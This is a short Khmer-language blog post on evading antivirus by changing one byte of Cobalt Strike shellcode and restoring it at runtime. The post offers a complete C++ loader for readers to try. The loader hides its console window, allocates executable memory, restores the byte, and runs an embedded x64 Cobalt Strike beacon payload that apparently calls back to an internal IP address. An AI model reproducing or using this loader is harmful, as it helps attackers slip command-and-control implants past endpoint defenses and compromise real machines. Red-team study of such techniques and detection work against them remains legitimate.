---
title: "1 Byte Changed Evading Antivirus"
date: 2022-12-03T21:01:06+07:00
description: Evading Antivirus ដោយប្រើប្រាស់បច្ចេកទេសប្ដូរតម្លៃលេខគោលពីរ
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- c-shellcode
- bypass
series:
- CobaltStrike
image: images/feature2/article-1.png
---

#### 1 Byte Evading

ដំបូងយើងត្រូវបង្កើត Shell Code ជាប្រភេទភាសារ C នៅក្នុង Cobalt Strike ដូចរូបខាងក្រោម៖

![c-shellcode](/en/posts/img/2022/12/1-byte-av-evading/c-shellcode.jpg)


សូមចាប់អារម្មណ៏ត្រង់ Byte ដំបូងគេនៃ Code គឺ <span style="color:grey">\xfc</span> ។
តស់!!! មកកែប្រែចំនួន Byte ដូចខាងក្រោម៖
<ul style="list-style-type:square">
	<li>ប្ដូរ <span style="color:grey">\xfc</span> ទៅជាចំនួនតម្លៃ Byte ផ្សេង។ ឧ. <span style="color:grey">\xfd, \x3a, \x6f\</span> ។ល។</li>
	<li>រក្សាតម្លៃដើមដែលត្រឹមត្រូវនៅក្នុង Char Variable => <span style="color:grey">char first[] = "<span style="color:red">\xfc</span>";</span></li>
	<li>Build ឯកសារ exe ជាមួយកម្មវិធីអានកូដជាការស្រេច។</li>
</ul>

ខាងក្រោមជា Source Code សម្រាប់អ្នកដែលចង់សាកល្បងវិធីសាស្ត្រមួយនេះ៕

{{< highlight cpp "linenos=table" >}}
//payload.cpp
#include "stdafx.h"
#include "Windows.h"
#include <iostream>

int main(int argc, char *argv[]) {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// cobalt strike beacon shellcode x64
	unsigned char shellcode[] = "\xfd\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x2e\x30\x2e\x30\x2e\x35\x00\x00\x00\x00\x00";
	char first[] = "\xfc";
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	memcpy(shellcode, first, 1);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();
	
	return 0;
}
{{< / highlight >}}

<b>ឯកសារយោង៖</b> [ired](https://www.ired.team/offensive-security/defense-evasion/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change)